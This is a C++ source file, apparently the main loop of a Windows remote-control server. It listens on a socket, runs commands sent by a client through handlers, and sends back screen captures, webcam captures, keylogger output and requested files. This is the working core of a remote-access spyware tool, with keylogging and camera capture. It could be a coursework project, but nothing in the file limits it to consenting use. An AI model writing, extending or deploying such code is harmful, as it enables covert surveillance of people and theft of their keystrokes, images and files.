#include "utils.h"

int main() {
    // Set up handlers
    map<string, map<string, function<void()>>> handlers = setupHandlers();
    
    // Init socket
    if (!AfxSocketInit()) {
        cerr << "\nFailed to initialize sockets. Error: " << GetLastError() << endl;
        return 0;
    }

    // Create server socket
    CSocket server;
    if (!server.Create(PORT)) {
        cerr << "\nFailed to create server socket. Error: " << GetLastError() << endl;
        return 0;
    }

    // Listen for connection
    if (!server.Listen()) {
        cerr << "\nServer failed to listen. Error: " << GetLastError() << endl;
        return 0;
    }
    cout << "\nServer is listening on port " << PORT << "...\n";
        
    char buffer[BUFFER_SIZE]{ 0 };
    string cmd, opt;
    while (1) {
        // Accept client connection
        CSocket client;
        if (!server.Accept(client)) {
            cerr << "\nFailed to accept client connection. Error: " << GetLastError() << endl;
            return 0;
        }
        cout << "\nClient connected!\n";

        // Receive message from client
        client.Receive(buffer, BUFFER_SIZE);
        cout << "\nReceived from client: " << buffer << endl;

        // Parse message to stringstream for extracting command
        inp.str(buffer);
        inp.seekg(0);
        inp >> cmd >> opt;

        if (cmd.find("exit") != string::npos) {
            // Send message to client
            client.Send("Server stopped!", 16);
            
            // Close client socket
            client.Close();
            cout << "\nClient disconnected!\n";

            break;
        }

        try {
            // Call corresponding handler
            handlers[cmd][opt]();
        }
        catch (const exception& e) {
            if (strcmp(e.what(), "bad function call")) {
                out << "\nException: " << e.what() << endl;
            }
            else {
                out << "\nInvalid command!\n\n" << getInstruction();
            }
        }
        
        // Send message to client
        string response = out.str();
        out.str("");
        client.Send(response.c_str(), response.size() + 1);

        // Send file if needed
        if (opt == "screen") {
            sendFile(client, screenCapturePath);
        }
        else if (opt == "camera") {
            sendFile(client, webcamCapturePath);
        }
        else if (cmd == "stop" && opt == "keylogger") {
            sendFile(client, keyloggerCapturePath);
        }
        else if (opt == "get") {
            sendFile(client, requestFilePath);
        }
        
        // Close client socket
        cout << "\nClient disconnected!\n";
        client.Close();
    }

    // Close server socket
    cout << "\nServer stopped!\n";
    server.Close();
    
    return 0;
}